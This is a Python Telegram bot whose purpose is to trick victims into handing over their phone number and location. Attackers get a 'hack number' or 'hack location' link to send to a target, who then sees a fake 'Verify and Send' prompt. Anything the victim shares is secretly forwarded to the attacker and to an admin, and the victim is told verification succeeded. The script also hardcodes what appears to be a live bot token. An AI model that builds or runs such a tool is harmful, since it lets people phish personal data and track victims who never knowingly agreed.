import telebot
from telebot import types

# Bot Configuration
BOT_TOKEN = '7405631437:AAGz6S5JJsZSECM9-Q6L7h4OG5gv0Z1vocs'
bot = telebot.TeleBot(BOT_TOKEN)

BOT_USERNAME = 'USEFULXBOT'  # Without @
ADMIN_ID = 7401896933
FORCE_JOIN_CHANNEL = 'https://t.me/+g-i8Vohdrv44NDRl'
PRIVATE_CHANNEL_ID = -1002316557460

# In-memory store: user_id -> attack type
attack_type = {}  # {'user_id': 'number' or 'location'}

# Force Join Check
def check_force_join(message):
    try:
        user_status = bot.get_chat_member(PRIVATE_CHANNEL_ID, message.from_user.id)
        if user_status.status in ['left', 'kicked']:
            markup = types.InlineKeyboardMarkup()
            join_button = types.InlineKeyboardButton("Join Channel", url=FORCE_JOIN_CHANNEL)
            markup.add(join_button)
            bot.send_message(message.chat.id, "🔒 You must join our channel first.", reply_markup=markup)
            return False
        else:
            return True
    except Exception as e:
        print(f"Error checking force join: {e}")
        markup = types.InlineKeyboardMarkup()
        join_button = types.InlineKeyboardButton("Join Channel", url=FORCE_JOIN_CHANNEL)
        markup.add(join_button)
        bot.send_message(message.chat.id, "🔒 You must join our channel first.", reply_markup=markup)
        return False

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    if not check_force_join(message):
        return

    if message.text.startswith("/start l_"):
        # Victim came for location hack
        try:
            owner_id = int(message.text.split("_")[1])
            attack_type[message.chat.id] = ('location', owner_id)
            send_verification(message)
        except:
            main_menu(message)
    elif message.text.startswith("/start"):
        # Victim came for number hack
        try:
            owner_id = int(message.text.split(" ")[1])
            attack_type[message.chat.id] = ('number', owner_id)
            send_verification(message)
        except:
            main_menu(message)
    else:
        main_menu(message)

# Main Menu for attacker
def main_menu(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("🔗 Hack Number")
    btn2 = types.KeyboardButton("📍 Hack Location")
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "Welcome! Select what you want to hack:", reply_markup=markup)

# Send Verification button to victim
def send_verification(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("✅ Verify and Send", request_contact=True)
    markup.add(btn)
    bot.send_message(message.chat.id, "✅ Please verify and send your number to continue.", reply_markup=markup)

# Handle Text
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_force_join(message):
        return

    if message.text == "🔗 Hack Number":
        user_id = message.from_user.id
        link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
        bot.send_message(message.chat.id, f"🔗 Your hack number link:\n{link}\n\nCopy and send it to the victim!")
    elif message.text == "📍 Hack Location":
        user_id = message.from_user.id
        link = f"https://t.me/{BOT_USERNAME}?start=l_{user_id}"
        bot.send_message(message.chat.id, f"📍 Your hack location link:\n{link}\n\nCopy and send it to the victim!")

# Handle Contact and Location
@bot.message_handler(content_types=['contact', 'location'])
def handle_contact_location(message):
    if message.chat.id not in attack_type:
        return

    hack_info = attack_type[message.chat.id]
    hack_type_value, owner_id = hack_info

    # Forward to owner (attacker)
    try:
        bot.forward_message(owner_id, message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error forwarding to owner: {e}")

    # Forward to admin
    try:
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error forwarding to admin: {e}")

    # Tell victim verified
    bot.send_message(message.chat.id, "✅ Verification completed successfully! Enjoy.")

    # Clean memory
    attack_type.pop(message.chat.id, None)

# Error handling
def handle_error(exception):
    print(f"Error: {exception}")

# Polling
print("Bot is running...")
try:
    bot.infinity_polling()
except Exception as e:
    handle_error(e)
